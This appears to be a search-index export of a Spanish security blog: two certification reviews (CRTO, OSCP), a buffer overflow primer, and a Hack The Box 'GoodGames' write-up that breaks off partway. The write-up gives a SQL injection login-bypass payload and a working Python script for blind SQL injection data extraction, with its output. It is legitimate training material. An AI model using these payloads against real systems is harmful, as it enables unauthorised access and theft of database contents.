[ { "title": "CRTO Review", "url": "/posts/crto-review/", "categories": "Review, Certificación", "tags": "Certificación, Pentesting, CRTO", "date": "2023-04-27 00:00:00 +0200", "snippet": "El pasado día 11 de Abril Zero-Point Security me mandó el mail que confirma que oficialmente he aprobado el CRTO (Certified Red Team Operator), por lo que quería compartir mi experiencia en esta nueva certificación.CursoEl curso se divide en varios temas, cada uno de estos temas está dividido en varios artículos, la mayoría de estos artículos vienen explicados en texto, en todo el curso te vas a encontrar con solo 14 vídeos.El curso te enseña en que se basa un C2 (Command and Control), sus características y como funcionan, en este caso, en el curso se usa Cobalt Strike, uno de los C2 más conocidos del mundo. Además de enseñarte como usar Cobalt Strike, te enseñan conceptos y skills necesarias para introducirte en el mundo del Red Team.Los contenidos del curso son buenos en general, sin embargo, le faltan cosas. Me explico, los contenidos abarcan una gran cantidad de temas pero no se para mucho a explicar el porqué de lo que se explota. Me da la sensación que el curso solo te explica como explotar las cosas con Cobalt Strike y no se para explicar en profundidad.Realmente esto no es malo en sí, simplemente puede ser que el curso esté orientado a personas que ya sepan desenvolverse en un Directorio Activo con soltura y que simplemente quieran experimentar con Cobalt Strike. Así que la conclusión que saco del curso es que el material que hay es bueno pero le falta añadir contexto en muchas cosas (o no).Aquí podéis ver los módulos que contiene el curso (bajad un poco):Syllabus CRTO¿Es suficiente el curso para poder aprobar?Aunque le falte mucho contenido que hable del porqué de las cosas, considero que el curso tiene todo y más de lo que necesitas para aprobar el examen. Eso sí, aunque el curso tenga el contenido necesario recomiendo encarecidamente que te mires por tu cuenta por qué se dan ciertas situaciones, ya que te va a ayudar mucho a ir mucho más rápido y tener una visión general más clara.Algo muy interesante del curso y que me gustó mucho es que a lo largo del curso te van dando consejos de OPSEC y advirtiendo de malas prácticas que deberías evitar. Aunque en el examen y en los laboratorios no tenga mucha importancia seguir los consejos que dan creo que le da un muy buen punto a la certificación, ya que uno de los puntos primordiales del Red Team es tratar de pasar desapercibido.LaboratorioEl laboratorio a mi me gustó bastante, vas a poder practicar todo los contenidos del curso y además se puede resolver de varias maneras, este concetpo es muy bueno ya que así no solo te limitas a copiar lo que se hace en el curso sino que también podrás hacer el famoso “Think outside of the box”.Este es el link a los laboratorios: LaboratoriosEs un poco raro como lo tienen montado, el laboratorio no lo tiene hosteado la empresa que proporciona la certificación (Zero-Point Security) sino que lo tiene otra empresa (Snap Labs), para acceder al laboratorio tendrás que pagar una suscripción por meses (la suscripción solo la puedes pagar si ya has comprado la certificacición). Esta suscripción no te da acceso las horas que quieras durante un mes, sino que según cuanto dinero pagues tendrás más horas de acceso al laboratorio, tenéis los precios aquí: Precios Laboratorios CRTOLa conexión al laboratorio se realiza mediante “Apache Guacamole” y no tendrás conexión a Internet, por lo que no podrás usar herramientas personalizadas, solo podrás usar las herramientas que te proporcionan.En cuanto a problemas relacionados con el laboratorio, puedo decir que se ha portado bastante bien. El único problema que tenido ha sido que de forma casual no podía poner algunos caracteres como el “\\”, quitando esto, no he experimentado más problemas en el laboratorio.Además de lo que puede ser considerado como el propio laboratorio (entorno de equipos a explotar), hay unas aplicaciones que podemos usar si deseamos, una de ellas, Kibana es utilizada en el curso de forma opcional para ver los rastros que dejamos al momento de realizar ciertas acciones. Es lo mismo que he dicho antes con los consejos OPSEC, no hace falta mirarlo pero le da mucho valor al laboratorio para saber que trazas estás dejando, algo que considero importante en el Red Team.Experiencia PreviaAntes de empezar el curso disponía de varias certificaciones, la más importante el OSCP, por otro lado, no dispongo de experiencia laboral ni de Pentester ni de Red Team Operator. Como veis, no tengo mucha experiencia previa en Red Team, así que no os preocupéis demasiado por esto.ExamenEl examen consiste en una prueba práctica de 48 horas que puedes repartir en 4 días en el que debes poner a prueba los conocimientos adquiridos en el curso. Es un examen que no es vigilado (protored) y en el cual no es necesario la elaboración de un reporte. El examen tiene un enfoque en el cual hemos sido contratados para tratar de emular el comportamiento del “APT99” en el cliente.Como dije en un apartado anterior, con el curso te da de sobra para aprobar, de hecho, hay bastantes cosas que no vas a usar en el examen.Al igual que en el curso, la conexión será mediante “Apache Guacamole” a una máquina en la dispondrás de todas las herramientas que posteriormente usarás, además de esto, no tendrá salida a Internet. El objetivo del examen es llegar a Administrador en 6 máquinas de 8 que hay en el examen (75%). El enfoque del examen es un “Assumed Breach”, es decir, se presupone que ya ha habido una brecha de seguridad en la organización.Hablando de los problemas relacionados con el examen no puedo decir lo mismo que dije del laboratorio, en este caso, todo lo que podía salir mal me salió mal. En mi caso, la experiencia del examen fue horrible, se me caían todo el rato los beacons, tenía que ejecutar 10 veces el mismo comando para que me funcionara, había flags que no estaban donde tenían que estar…Teniendo todos estos problemas solamente conseguí los requisitos mínimos (6 flags), decidí que en cuanto consiguiera los requisitos mínimos dejaría el examen por lo molesto que estaban siendo los problemas.Pros vs ContrasTras tener una visión general de la certificación voy a pasar a mostrar los pros y contras de la certificación:ProsLos principales “pros” que le veo a la certificación son el dinero que cuesta y lo única que es. En el mercado, el CRTO es de la únicas certificaciones que te enseñan a usar un C2. Por otro lado, el precio de la certificación son unos “£365.00”, bastante barata si lo comparamos con otras certificaciones y además este curso es de acceso de por vida, por lo que pagas una vez y si lo vuelven a actualizar podrás acceder a estos nuevos contenidos.ContrasAunque al final no usé el soporte del CRTO durante el examen, he visto gente quejandose del soporte porque a veces tardan mucho en responder, esta imagen habla por si sola:Resumen del soporteOtra contra (no puedo comprobarla) es que en España no es muy conocida (o esa es mi sensación), he estado preguntando a gente y no muchos la conocen y en las ofertas no se suele nombrar mucho esta certificación. Por otro lado, tengo algún amigo que ha entrado de Red Team Operator teniendo esta certificación, así que esto puede variar entre empresas y paises.ConclusionesEs una certificación que vale su costo sin duda, es una certificación barata y tiene un contenido único y extenso. Tiene algunas contras pero considero que los pros tienen mucho mayor peso. Por esto recomiendo esta certificación si quieres aprender a usar un C2 bastante conocido y a la vez aprender ataques y fallos en Directorio Activo." }, { "title": "Fundamentos de Buffer Overflow", "url": "/posts/buffer-overflow/", "categories": "Explicación, BOF", "tags": "BOF, Laboratorio", "date": "2023-02-20 00:00:00 +0100", "snippet": "Buffer Overflow es una de las mayores vulnerabilidades persistentes a pesar de la evolución y complejidad de los mecanismos de seguridad que existen hoy en día. Se encuentra presente en diversas aplicaciones por lo que aparece constantemente en las listas de vulnerabilidades críticas publicadas por instituciones enfocadas a la notificación de nuevas amenazas de seguridad.¿Qué es un registro?Un registro es una memoria de alta velocidad y poca capacidad, es utilizada para almacenar datos necesarios para la ejecución de un programa, además, algunos tienen funciones específicas que describiré más tarde. Pueden variar la longitud de estos dependiendo de la arquitectura del CPU (Central Processing Unit) los de 32 bits empiezan por la letra “E” y los de 64 bits empiezan por la letra “R” (nomenclatura de los registros).Cuando un programa es ejecutado, el sistema operativo reserva una zona de la memoria para que el programa realice correctamente sus instrucciones, este espacio se dividide en zonas de acuerdo al tipo de dato que almacena y la función que realiza. Nombre Nomenclatura x32 Nomenclatura x64 Tipo Uso Accumulator EAX RAX Datos Operaciones aritméticas Base EBX RBX Datos Especifica operandos Counter ECX RCX Datos Conteo de bucles en iteraciones Data EDX RDX Datos Operaciones aritméticas (números grandes) Source Index ESI RSI Índice Apunta al origen en operaciones en cadena Target Index EDI RDI Índice Apunta al destino en operaciones en cadena Base Pointer EBP RBP Puntero Almacena la dirección de memoria original del stack Top Pointer ESP RSP Puntero Almacena la dirección de memoria del elemento más reciente del stack Instruction Pointer EIP RIP Puntero Apunta a la dirección de memoria de la siguiente instrucción a ejecutar Nosotros, para explotar este Buffer Overflow vamos a quedarnos con los registros EIP/RIP y el ESP/RSP, en otras ocasiones necesitaremos otros registros pero en esta ocasión no.¿Qué es un buffer?Son regiones de memoria reservadas para el almacenamiento temporal de datos de entrada en un programa, están localizadas en el stack y en el heap dependiendo del tipo de dato que se quiera almacenar.Cuando se produce un buffer overflow, los datos adicionales escritos en el búfer sobrescriben la memoria adyacente, lo que puede causar que el programa falle o que se comporta de manera impredecible. Si un atacante puede explotar esta vulnerabilidad, puede utilizar técnicas de inyección de código para ejecutar su propio código en el sistema afectado.Esquema de Buffer Overflow Stack: almacena los argumentos de las funciones, las variables locales y las direcciones de retorno de las llamadas a funciones. Funciona mediante el algoritmo LIFO (Last In Firts Out), para entender este algoritmo podemos imaginar que la memoria es una caja y los datos son libros. Si nosotros metemos el libro de matemáticas, luego el de historia y por último el de lengua tendremos que sacar primero los que estan encima (historia y lengua) para luego poder sacar el último (matemáticas). Aunque parezca ilógico, cuando se almacena un nuevo valor en el stack el Top Pointer (ESP) tendrá un valor de memoria inferior, por ejemplo, antes de introducir un nuevo valor el ESP valía 0xbffff590 y luego de introducirlo vale 0xbffff58c. Es decir, cuando la pila crece lo hace hacia direcciones menores y cuando decrece lo hace hacia direcciones mayores. Heap: gestiona la memoria dinámica (memoria solicitada durante la ejecución del programa), por ejemplo, utilizando las funciones malloc(), alloc() o free() entre otras. El heap funciona de forma parecida al STACK en cuanto al manejo de las direcciones de memoria, cuando el HEAP crece lo hace hacia direcciones mayores y cuando decrece lo hace hacia direcciones menores. Text: contiene las instrucciones ejecutables del programa, además, es un área de solo lectura para evitar que se editen estas instrucciones. Data: se divide en “Unintialized data” y “Intialized data”. Unintialized data: almacena variables globales y variables estáticas inicializadas a cero o tienen una inicialización explícita en el código, por ejemplo, static int i;. Initialized data: almacena datos que tienen un valor predefinido y se pueden modificar, por ejemplo, int val = 3; char string [] = \"Hola mundo\";. Para poder ver claramente la diferencia entre el stack y el heap podemos usar un programa de C, el código es el siguiente:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void foo(int valor) { unsigned char c; unsigned char *ptr = malloc(1); printf(\"Stack: %p | Heap: %p\\n\", &amp;c, ptr); if(valor &lt;= 0) return; foo(valor - 1);}int main(){ foo(10); return 0;}Diferencia entre las direcciones de memoria del stack y heapComo podéis observar, en ambos casos (HEAP Y STACK) se van añadiendo datos, sin embargo, el valor de las direcciones de memoria del STACK va decrementando en cada iteración y las del HEAP va aumentando, dejo una tabla para que se vea de forma más clara: Estructura Valor Hexadecimal Valor Decimal Stack 0x7ffcdb8cef77 140723991932791 Stack 0x7ffcdb8cef47 140723991932743 Stack 0x7ffcdb8cef17 140723991932695 Heap 0x55798f09f2a0 93980579197600 Heap 0x55798f09f6d0 93980579198672 Heap 0x55798f09f6f0 93980579198704 Little Endian y Big EndianLittle Endian y Big Endian son dos formas diferentes de ordenar los bytes en memoria.En un sistema Little Endian, los bytes menos significativos (el byte más pequeño) se almacenan en la dirección de memoria más baja, mientras que los bytes más significativos (el byte más grande) se almacenan en la dirección de memoria más alta. En otras palabras, el byte menos significativo de la palabra se almacena primero y el byte más significativo se almacena al final. Esto significa que al leer la palabra de izquierda a derecha, se verán primero los bytes menos significativos y luego los más significativos.En un sistema Big Endian, los bytes más significativos se almacenan en la dirección de memoria más baja, mientras que los bytes menos significativos se almacenan en la dirección de memoria más alta. En otras palabras, el byte más significativo de la palabra se almacena primero y el byte menos significativo se almacena al final. Esto significa que al leer la palabra de izquierda a derecha, se verán primero los bytes más significativos y luego los menos significativos. Estructura Byte 0 Byte 1 Byte 2 Byte 3 Completo Little Endian 0x78 0x56 0x34 0x12 0x78563412 Big Endian 0x12 0x34 0x56 0x78 0x12345678 Saber si la arquitectura del equipo que estamos intentando vulnerar utiliza little endian o big endian es muy importante, ya que si no sabemos esto los formatos de las direcciones de memoria no serán los correctos por lo que no podremos explotar el buffer overflow.¿Qué es Buffer Overflow?Buffer Overflow es una vulnerabilidad asociada al desbordamiento de la memoria a través de un uso excedido de esta, de ahí viene el nombre de Buffer Overflow (desbordamiento de memoria).Cuando se produce un buffer overflow, los datos adicionales escritos en el buffer sobrescriben la memoria adyacente, lo que puede causar que el programa falle o que se comporte de manera inesperada, pudiendo llegar a causar una ejecución remota de comandos. Si un atacante puede explotar esta vulnerabilidad, puede utilizar técnicas de inyección de código para ejecutar su propio código en el sistema afectado.Tipos de Buffer OverflowLos 2 tipos de buffer overflow se clasifican según el espacio de memoria que se sobreescribe al momento de hacer el overflow:Esquema de Buffer Overflow Stack Overflow: un stack overflow ocurre cuando se agota la memoria asignada para el stack de una aplicación. El stack es una región de memoria utilizada para almacenar información sobre las llamadas de funciones en una aplicación. Cuando se llama a una función, se agregan datos a al stack y cuando se regresa de la función, se eliminan los datos del stack. Si se agota la memoria asignada para el stack, se produce un desbordamiento del stack. Heap Overflow: un heap overflow ocurre cuando se agota la memoria asignada para el heap de una aplicación. El heap es una región de memoria utilizada para almacenar datos dinámicos que se asignan y liberan durante la ejecución de una aplicación. Si se asigna más memoria de la que se ha reservado para el heap, se produce un desbordamiento del heap Explotación de Buffer OverflowEn este post no voy a explicar como se explota un Buffer Overflow, creo no es necesario ya que hay infinitos recursos que explican esto. Por lo que para mí no tiene sentido subir un contenido repetido. Igualmente os voy a dejar algunos recursos que creo que os pueden servir para aprender a explotar uno: Gatogamer: Linux Stack Overflow y Windows Stack Overflow Deep Hacking: Fundamentos Stack Overflow Rapid: Stack Overflow LiveUnderflow: Linux Heap OverflowMitigaciónComo he explicado, un buffer overflow puede llegar a ser muy peligroso ya que puede conllevar una ejecución remota de comandos, es por esto que es muy importante saber protegernos de este. Aquí os dejo algunos consejos para prevenirlos en vuestros programas: Verificar la entrada de datos: Es importante validar la entrada de datos y asegurarse de que cumple con los requisitos de formato y tamaño antes de procesarla. Limitar el tamaño de los datos de entrada: Si el tamaño de los datos de entrada no se puede validar, es importante limitar el tamaño del búfer de memoria asignado para la entrada de datos. Utilizar funciones seguras: En muchos lenguajes de programación, existen funciones seguras que se pueden utilizar en lugar de funciones inseguras que podrían causar un buffer overflow. Por ejemplo, en C, se pueden utilizar las funciones strncpy o strlcpy en lugar de strcpy. Implementar mecanismos de protección de memoria: Muchos sistemas operativos y lenguajes de programación ofrecen mecanismos de protección de memoria que pueden ayudar a prevenir los buffer overflows. Por ejemplo, podemos usar algunas características de seguridad como DEP, PIE y ASLR. Utilizar análisis de código estático y pruebas de penetración: Es importante realizar pruebas de seguridad en el código para detectar posibles vulnerabilidades, incluidos los buffer overflows. Las pruebas de penetración también pueden ser útiles para identificar vulnerabilidades y verificar si las medidas de mitigación son efectivas." }, { "title": "OSCP Review", "url": "/posts/oscp-review/", "categories": "Review, Certificación", "tags": "Certificación, Pentesting, OSCP", "date": "2023-01-05 00:00:00 +0100", "snippet": "El pasado día 5 de enero Offensive Security me mandó el mail que confirma que oficialmente he aprobado el OSCP (Offensive Security Certified Professional), por lo que quería compartir mi experiencia en esta nueva certificación, analizándola de manera crítica.Curso PEN-200Los contenidos del curso empiezan con la base más elemental que puedas imaginar (empiezan como si no hubieras tocado la terminal en la vida), sin embargo, esto no quiere decir que la certificación vaya a ser un paseo. Cuando me preguntan sobre los contenidos me gusta decir esta frase: “La certificación puede llegar a ser de ‘entry level’ pero te aseguro que no vas a salir de esta teniendo el nivel que tenías cuando entraste”.Estos son módulos que contiene el curso: Penetration Testing with Kali Linux: Genral Course Information Getting Comfortable with Kali Linux Command Line Fun Practical Tools Bash Scripting Passive Information Gathering Active Information Gathering Vulnerability Scanning Web Application Attacks Introduction to Buffer Overflows Windows Buffer Overflows Linux Buffer Overflows Client-Side Attacks Locating Public Exploits Fixing Exploits File Transfers Antivirus Evasion Privilege Escalation Password Attacks Port Redirection and Tunneling Active Directory Attacks The Metasploit Framework PowerShell Empire Assembling the Pieces: Penetration Test Breakdown Trying Harder: The LabsCada módulo del curso viene explicado de dos formas, mediante vídeos o mediante diapositivas. La verdad, los módulos buenos se cuentan con los dedos de las manos. Los que podría resaltar son el 11, 12, 18 y 20. Exceptuando los citados anteriormente, ningún módulo profundiza demasiado y tampoco son muy complejos.¿Es suficiente el curso para poder aprobar?La verdad es que no, mis sensaciones es que ellos te dan lo mínimo de cada tema (hay alguna excepción) para que puedas orientarte y ya luego tú investigas por tu parte. Por ejemplo, en el apartado “Web Application Attacks” te enseñan 4 vulnerabilidades y cómo explotarlas, pero esto no significa que no te puedas topar con otras en los labs o en el propio examen, de hecho eso es lo que me pasó a mi.El curso deja bastante que desear, cualquier otra certificación tiene más y mejor contenido. Con esto no quiero decir que el contenido en general sea de lo peor. Si comparas el directorio activo (AD) del curso con otros te darás cuenta de que no tiene nada ver. Pero, ¿por qué pasa esto? Pues la explicación es bastante sencilla, al tener un curso de, por ejemplo, 1000 páginas en el que tienes que dar 10 temas se te quedarán 100 páginas por tema de modo que no profundizas mucho en cada uno. Por el contrario, en otro curso en el que den 500 páginas pero que solo se centre en 2 temas se quedará en 250 páginas por tema, pudiendo profundizar muchisimo más en cada cosa. Aunque el contenido en general de este último curso sea la mitad de largo por cada tema será el doble de largo.Entonces, ¿el temario del curso del OSCP es malo? En general no, lo que le pasa es que tiene el contenido distribuido en bastantes temas. Te recomiendo que si quieres profundizar en un aspecto muy concreto (active directory, exploiting, web…) vayas a otra certificación, ya que esta si bien es cierto que da todo esto, lo hace de forma superficial.LaboratoriosUna de las partes fuertes de la certificación son los laboratorios, una serie de máquina (73 aproximadamente) que te preparan para el examen. Junto con las máquinas de Proving Grounds son los mejores laboratorios que he probado. Te preparan no solo de forma de aprender nuevas técnicas, sino que también te ayudan a forjar una buena metodología.Puedo decir con seguridad que son los laboratorios más realistas y que mejor te preparan que he probado, todos los conceptos que se ven en el curso los vas a poder probar en los laboratorios sin excepción alguna. Aun así, tiene algunos fallos gordos, por ejemplo, las máquinas son compartidas de tal forma que los usuarios pueden llegar a molestar a otros quitando cosas de alguna máquina. Algo parecido me pasó a mí, estaba haciendo una máquina en la que en un momento te tienes que conectar por RDP y cada cierto tiempo me echaba ya que había otro usuario entrando por esa misma sesión, algo bastante molesto la verdad.Aparte de los propios laboratorios que te proporcionan en el OSCP tienes otras muchas formas de preparar el examen. Yo usé el siguiente excel para ver que máquinas parecidas al OSCP tenía cada plataforma. Especialmente recomiendo las máquina del “Proving Grounds Practice” ya que son máquinas creadas por Offensive Security, incluso hay algunas máquinas que antes estaban en examenes.Experiencia PreviaAntes de empezar el curso tenía aproximadamente 50 máquinas hechas en Hack The Box y otras cuantas en otras plataformas. En cuanto a certificaciones, solo tenía el eJPTv1. Como veis, no tenía mucha experiencia previa, ni siquiera tengo experiencia laboral en el sector así que no os preocupéis demasiado por esto.Examen OSCPEste es uno de los puntos fuertes de la certificación junto con los labs. El examen se divide en 2 partes, la explotación y el reporte, durando cada una un día. En el día de explotación tendrás que intentar entrar en los diferentes equipos y escalar privilegios, en el día de reporte como su propio nombre indica tendrás que realizar el reporte de lo que hiciste el día anterior.Para aprobar el examen deberás tener 70 puntos o más hasta un máximo de 100 puntos, se dividen de la siguiente forma: 60 puntos: Máquinas Independientes. 3 máquinas siendo cada una de 20 puntos (10 puntos entrada + 10 puntos de escalada). 40 puntos: Set de AD (Active Directory). 2 clientes y un DC (Domain Controller), si no consiges comprometer todos los equipos no consiges los 40 puntos. Además, aparte de los puntos que puedas realizar en el examen puedes conseguir hasta 10 puntos extra, los podrás conseguir si haces lo siguiente (existe una forma más de poder conseguir estos puntos, pero no la explicaré, ya que a partir del 31/01/2023 se dejará de poder usar): 30 máquinas hechas en el laboratorio 80% de los ejercicios hechos por cada categoría del curso.El examen es “Proctored”, es decir, que hay una persona que te está vigilando en todo lo que haces para impedir que puedas hacer trampa. Además, antes de poder empezar a realizar el examen tienes que hacer un procedimiento muy riguroso en el que te pedirán que muestres la habitación, el DNI, que alejes el móvil…Personalmente, yo tardé aproximadamente unas 8 horas en conseguir los puntos suficientes para aprobar, teniendo ya comprometido todo el set de AD, una máquina independiente y los 10 puntos adicionales. Luego de otras 4 horas conseguí comprometer otra máquina, en total conseguí 2 máquinas independientes (40 puntos), set de AD (40 puntos) y los 10 puntos adicionales, quedandome en unos 90 puntos en total.A continuación llega una de las preguntas que más he escuchado, ¿con qué nivel se asemejan las máquinas del examen en comparación con otras plataformas? Lo primero que quiero decir es que en cada caso de examen será distinto, por lo que puede que a otro se salga un examen más fácil o más difícil que el mío. Teniendo claro esto, lo compararé con las máquinas de 2 plataformas, Hack The Box y Proving Grounds ya que son las que más he utilizado. Diría que en comparación con Hack The Box le pondría un nivel entre “Medium” y “Hard”, en comparación con Proving Grounds le asignaría el nivel “Hard”.Recomendaciones Crea tu propia cheatsheet, no es lo mismo copiar una de otra persona que hacer una propia. Haceros apuntes de todo, desde la enumeración de cada servicio (SSH, web, SMB…) hasta conceptos (privilege escalation, port forwarding, active directory…). Crea una buena metodología, siento ser pesado, pero es la verdad. Todo se basa en la metodología, es lo que va a definir si eres capaz o no de encontrar la vulnerabilidad. Utiliza recursos externos, recomiendo encarecidamente que inviertas en conocimiento paralelamente al OSCP, por ejemplo, Privilege Escalation Tib3rius, Hack The Box, Proving Grounds, PortSwigger y otros más. Try Harder!ConclusionesSi bien es cierto que el OSCP no es la certificación por excelencia en cuanto a contenido respecta, es una de las mejores por no decir la mejor en cuanto a prestigio y reconocimiento. Es por esto que realmente la recomiendo si quieres empezar tu carrera en la ciberseguridad, si quieres mejorar tu puesto de trabajo, si quieres tener una certificación que realmente avale tus conocimientos o si simplemente quieres ponerte un reto.Certificación OSCP" }, { "title": "GoodGames Writeup", "url": "/posts/writeup-goodgames/", "categories": "Writeup, HTB", "tags": "Linux, CTF, Easy, SQLi, Contenedor, SSTI, SUID, Linux", "date": "2022-08-29 00:00:00 +0200", "snippet": "Máquina Easy, nos aprovechamos de una inyección SQL para saltarnos el panel de login, convirtiendonos en el usuario administrador de la página, encontramos un subdominio y metemos en él unas credenciales que encontramos en otra inyección SQL de tipo Boolean Based, por último, nos aprovechamos de reutilizar contraseñas y un bash SUID.Recopilación de informaciónPrimero vamos a comprobar la conectividad con la máquina.❯ ping -c 1 10.10.11.130PING 10.10.11.130 (10.10.11.130) 56(84) bytes of data.64 bytes from 10.10.11.130: icmp_seq=1 ttl=63 time=32.0 ms--- 10.10.11.130 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 32.028/32.028/32.028/0.000 msEn la salida del comando anterior se puede ver un parámetro llamado ttl, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima. GNU/Linux = TTL 64 Windows = TTL 128En este caso, el sistema operativo que está corriendo en la máquina víctima es Linux.Vamos a usar la herramienta nmap para descubrir que puertos están abiertos y que servicios están asociados a estos.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.130 -oG allPorts -p- -&gt; Escanea todos los puertos (65535) –open -&gt; Muestra solo los puertos con un estatus “open” -sS -&gt; Aplica un TCP SYN Scan –min-rate 5000 -&gt; Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo -vvv -&gt; Muestra la información en pantalla a medida que se descubre -n -&gt; Indica que no aplique resolución DNS -Pn -&gt; Indica que no aplique el protocolo ARP 10.10.11.130 -&gt; Dirección IP que se quiere escanear -oG allPorts -&gt; Exporta el output a un fichero grepeable con nombre “allPorts”Este sería el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 12:49 CESTScanning 10.10.11.130 [65535 ports]PORT STATE SERVICE REASON80/tcp open http syn-ack ttl 63Ahora vamos a realizar un escaneo más profundo, también con nmap pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.❯ nmap -p80 -sC -sV 10.10.11.130 -oN targeted -p80 -&gt; Indica los puertos que se quieren escanear -sC -&gt; Lanza scripts básicos de enumeración -sV -&gt; Enumera la versión y servicio que está corriendo en los puertos 10.10.11.130 -&gt; Dirección IP que se quiere escanear -oN targeted -&gt; Exporta el output a un fichero en formato nmap con nombre “targeted”Este sería el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 13:17 CESTNmap scan report for internal-administration.goodgames.htb (10.10.11.130)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.51| http-title: Flask Volt Dashboard - Sign IN | AppSeed|_Requested resource was http://internal-administration.goodgames.htb/login| http-server-header: | Werkzeug/2.0.2 Python/3.6.7|_ Werkzeug/2.0.2 Python/3.9.2Los puertos abiertos y sus servicios asocidados son: 80/tcp -&gt; httpEmpezaremos enumerando la web, primero podemos empezar enumerando las tecnologías que está utilizando la página. Esto lo podemos hacer utilizando un plugin del navegador llamadado Wappalyzer o utilizando la herramienta whatweb.❯ whatweb http://10.10.11.130http://10.10.11.130 [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]Lo más interesante que vemos utilizando Wappalyzer es que se está utilizando Flask, por lo que podemos intuir que vamos a tener que utilizar un SSTI (Server Side Template Injection) en algún momento. Ahora vamos a enumerar directorios con dirsearch.❯ dirsearch -u http://10.10.11.130/ -x 404 -t 200 -u http://10.10.11.130/ -&gt; Indica la url -x 404 -&gt; Oculta las peticiones que arrojan un código de estado 404 -t 200 -&gt; Indica el número de hilos que queremos usarLas rutas que hemos encontrado son las siguientes:Target: http://10.10.11.130/[13:21:48] Starting: [13:22:26] 200 - 43KB - /blog[13:22:44] 200 - 9KB - /login[13:22:45] 302 - 208B - /logout -&gt; http://10.10.11.130/[13:22:55] 200 - 9KB - /profile[13:22:58] 403 - 277B - /server-status[13:22:58] 403 - 277B - /server-status/[13:22:59] 200 - 33KB - /signupBusqueda de vulnerabilidadesVemos que la página está relacionada con los videojuegos, en el fuzzing que hemos realizado antes vimos que tenemos un “/login” y un “/signup”. Vamos a meternos a “/signup” para registrarnos en la página.Nos registramosYa registrados en la página, vamos a iniciar sesión.Iniciamos sesiónAl loguearnos vemos que nos redirige a una página en la que nos muestra los ajustes de nuestro usuario. No tenemos nada demasiado especial en estos ajustes, podemos intentar volver al login e intentar saltarnos el login con una inyección SQL de tal forma que entremos con el primer usuario, que por lo general es el administrador.ExplotaciónRecordemos que un panel de login nos dará como válido el intento de login cuando la query que se manda nos devuelva un valor “TRUE”, es decir, necesitamos que el mail y la contraseña sean correctos para la misma entrada, por lo que si introducimos un mail y una contraseña válidos pero de diferentes cuentas no nos devolvera un valor “TRUE”.Sabiendo que nos darán como válido el intento de login cuando la query devuelva un valor “TRUE” podemos aprovecharnos de esto intentando hacer que la query devuelva un valor “TRUE” sin proporcionar credenciales válidas inyectando SQL.Nuestro payload para saltarnos el login sería el siguiente:' or 1=1-- -Iniciamos sesión usando una inyección SQLVemos que nos ha funcionado, además, hemos iniciado sesión como un usuario “admin”, vemos que tenemos un botón que antes no teníamos.Entramos como el administrador de la páginaSi nos metemos al botón que no teníamos antes veremos que nos redirigen a un dominio nuevo, vamos a apuntarnoslo en el “/etc/hosts” para poder entrar en él.❯ echo \"10.10.11.130 internal-administration.goodgames.htb\" | sudo tee -a /etc/hostsAhora que tenemos el dominio relacionado con la IP, vamos a volver a entrar a la página.Entramos como el administrador de la páginaVemos otro login, si intentamos saltarnos de nuevo el panel de login con una inyección SQL no conseguiremos nada, necesitaremos unas credenciales para autenticarnos en el panel. Si nos acordamos, el panel de login anterior nos reportaba algo distinto dependiendo si el login era correcto o no. Nos podemos aprovechar de esto utilizando una inyección SQL de tipo “Boolean Based” explico todo esto mejor en el siguiente post.He creado el siguiente script en python para explotar la inyección SQL.#!/usr/bin/python3\"\"\"Usage: sqli.py (-p &lt;payload&gt;) [-l] (-r &lt;letras&gt;) (-i &lt;palabras&gt;)Options: -h --help Muestra este panel. -l Añade Limit a la query -r Rango de letras por palabra -i Rango de palabras\"\"\"from pwn import *from docopt import docoptimport requests, signal, string# Variables globalesurl = \"http://10.10.11.130/login\"header = {\"Content-Type\": \"application/x-www-form-urlencoded\"}numbers = string.digitsletters = string.ascii_lowercasesimbols = r\"-_:@!$%&amp;()*+/;&lt;=&gt;?[\\]^{|}.~\"dictionary = numbers + letters + simbolsresult = \"\"def def_handler(sig, frame): print(\"\\n[+] Saliendo...\") exit(1)# Ctrl + Csignal.signal(signal.SIGINT, def_handler)def makeRequest(payload): data_post = { 'email':'%s' % payload, 'password':'xdann1' } r = requests.post(url, data=data_post, headers=header) return rif __name__ == \"__main__\": arguments = docopt(__doc__, version='Naval Fate 2.0') p2 = log.progress(\"Brute Forcing\") p1 = log.progress(\"Output\") for n in range(0, int(arguments[\"&lt;palabras&gt;\"])): for i in range(1, int(arguments[\"&lt;letras&gt;\"]) + 1): for c in dictionary: default = arguments[\"&lt;payload&gt;\"] if arguments[\"-l\"] == True: limit = \"(%s limit %d,1)\" % (arguments[\"&lt;payload&gt;\"], n) default = limit payload = \"a' or SUBSTR(%s ,%d,1)='%s'-- -\" % (default, i, c) r = makeRequest(payload) p2.status(\"Probando en el resultado %d con el caracter %s en la posicion %d\" % (n, c, i)) if \"Login Success\" in r.text: result += c p1.status(result) result += \" \"Vamos a sacar la base de datos actual, el usuario y la versión de la base de datos.❯ python3 sqli.py -p \"select concat(@@version,':',user(),':',database())\" -l -r 40 -i 1[┬] Brute Forcing: Probando en el resultado 0 con el caracter ~ en la posicion 40[┬] Output: 8.0.27:main_admin@localhost:mainVamos a sacar las bases de datos existentes.❯ python3 sqli.py -p \"select schema_name from information_schema.schemata\" -l -r 20 -i 5[├] Brute Forcing: Probando en el resultado 4 con el caracter &gt; en la posicion 6[├] Output: information_schema mainVamos a sacar las tablas de la base de datos “main”.❯ python3 sqli.py -p \"select table_name from information_schema.tables where table_schema='main'\" -l -r 20 -i 5[├] Brute Forcing: Probando en el resultado 2 con el caracter b en la posicion 10[ ] Output: blog blog_comments userVamos a sacar las columnas de la tabla “user”.❯ python3 sqli.py -p \"select column_name from information_schema.columns where table_schema='main' and table_name='user'\" -l -r 10 -i 5[▇] Brute 